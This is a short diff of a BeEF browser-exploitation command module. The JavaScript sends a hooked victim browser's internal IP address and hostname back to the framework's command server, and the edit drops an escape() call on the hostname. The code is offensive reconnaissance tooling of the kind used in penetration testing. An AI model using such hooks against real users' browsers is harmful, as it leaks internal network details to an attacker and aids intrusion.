@@ -5,6 +5,6 @@ beef.execute(function() {
 
 	if(internal_ip && internal_hostname) {
 		beef.net.send('<%= @command_url %>', <%= @command_id %>,
-			'internal_ip='+internal_ip+'&internal_hostname='+escape(internal_hostname));
+			'internal_ip='+internal_ip+'&internal_hostname='+internal_hostname);
 	}
 });
